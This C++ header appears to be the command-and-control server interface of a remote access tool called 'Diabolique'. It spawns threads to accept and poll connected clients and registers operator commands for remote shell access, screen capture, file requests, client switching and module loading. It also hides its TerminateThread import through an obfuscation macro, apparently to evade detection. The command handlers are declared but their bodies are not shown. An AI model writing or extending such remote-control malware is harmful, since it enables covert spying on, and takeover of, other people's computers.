#ifndef _H_IDIABOLIQUESERVERINTERFACE
#define _H_IDIABOLIQUESERVERINTERFACE

#ifdef _MSC_VER
#pragma once
#endif
#if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
#include <CDiaboliqueServer.h>


class IDiaboliqueServerInterface;

typedef bool(IDiaboliqueServerInterface::* fnDiaboliqueServerInterfaceCommand_t)(std::string command_string, int* nPos);

class IDiaboliqueServerInterface
{
public:

	IDiaboliqueServerInterface()
	{
		m_pAcceptThread = new std::thread(&IDiaboliqueServerInterface::_INTRNL_AcceptClientsThread, this);
		m_pCLIThread = new std::thread(&IDiaboliqueServerInterface::_INTRNL_HandleUserInputThread, this);
		m_pPollClientDataThread = new std::thread(&IDiaboliqueServerInterface::_INTRNL_PollClientDataThread, this);
	}

	~IDiaboliqueServerInterface()
	{
		if (m_pAcceptThread)
		{
			WINDOWS_IMPORT_HIDE(TerminateThread, "Kernel32.dll");
#ifdef _MSC_VER
			_TerminateThread(m_pAcceptThread->native_handle(), 0);
			_TerminateThread(m_pCLIThread->native_handle(), 0);
			_TerminateThread(m_pPollClientDataThread->native_handle(), 0);
#endif
		}
	}

	virtual int AddClient(CDiaboliqueServerClient* pCli)
	{
		return m_Server.AddClient(pCli);
	}

	virtual int RemoveClient(CDiaboliqueServerClient* pCli)
	{
		return m_Server.RemoveClient(pCli->GetClientID());
	}

	virtual int RemoveClient(int nCli)
	{
		return m_Server.RemoveClient(nCli);
	}

	void PopulateCommands()
	{
		m_Commands["setmodule"] = &IDiaboliqueServerInterface::SetModuleCommand;
		m_Commands["setclient"] = &IDiaboliqueServerInterface::SetClientCommand;
		m_Commands["sc"] = &IDiaboliqueServerInterface::SetClientCommand;
		m_Commands["dumpclients"] = &IDiaboliqueServerInterface::SetDumpClientsCommand;
		m_Commands["addmodule"] = &IDiaboliqueServerInterface::AddModuleCommand;
		m_Commands["dumpmodules"] = &IDiaboliqueServerInterface::DumpModulesCommand;
		m_Commands["initmodule"] = &IDiaboliqueServerInterface::InitModuleCommand;
		m_Commands["availservmods"] = &IDiaboliqueServerInterface::ListValidServerModules;
		m_Commands["openscreencap"] = &IDiaboliqueServerInterface::StartScreenCapture;
		m_Commands["osc"] = &IDiaboliqueServerInterface::StartScreenCapture;
		m_Commands["disconnect"] = &IDiaboliqueServerInterface::DisconnectClient;
		m_Commands["requestfile"] = &IDiaboliqueServerInterface::RequestFile;
		m_Commands["shell"] = &IDiaboliqueServerInterface::ShellCommand;
	}		

	std::vector<int> GetClients()
	{
		return m_Server.GetClients();
	}
#if defined(SERVER) || defined(DEBUG) || defined(SERVER_CLIENT)
	std::string GetClientName(int nIndex, bool* pFailed = nullptr)
	{
		return m_Server.GetConnectionName(nIndex, pFailed);
	}
#endif

protected:

	std::map <std::string, fnDiaboliqueServerInterfaceCommand_t> m_Commands;

	bool SetModuleCommand(std::string command, int* nPos);
	bool SetClientCommand(std::string command, int* nPos);
	bool SetDumpClientsCommand(std::string command, int* nPos);
	bool AddModuleCommand(std::string command, int* nPos);
	bool DumpModulesCommand(std::string input, int* nPos);
	bool InitModuleCommand(std::string input, int* nPos);
	bool ListValidServerModules(std::string input, int* nPos);
	bool StartScreenCapture(std::string input, int* nPos);
	bool DisconnectClient(std::string input, int* nPos);
	bool RequestFile(std::string input, int* nPos);
	bool ShellCommand(std::string input, int* nPos);
	virtual void _INTRNL_AcceptClientsThread() = 0;
	virtual void _INTRNL_PollClientDataThread()
	{
		while (true)
		{
			m_Server.PollClients();
			//m_Server.PollCurrentClientData();
		}
	}
	virtual void _INTRNL_HandleUserInputThread();


	std::string PromptIfEmpty(std::string str, const char* szPrompt, int nOffset, int* nPos);
	std::string FindNextField(std::string str, int nOffset, int* nPos);


	std::thread* m_pAcceptThread;
	std::thread* m_pCLIThread;
	std::thread* m_pPollClientDataThread;
	CDiaboliqueServer m_Server;
	int m_nCurrentModule = 0;
	bool m_bSettingValues = true;
};



#endif // #if defined(SERVER) || defined(_DEBUG) || defined(SERVER_CLIENT)
#endif // _H_IDIABOLIQUESERVERINTERFACE
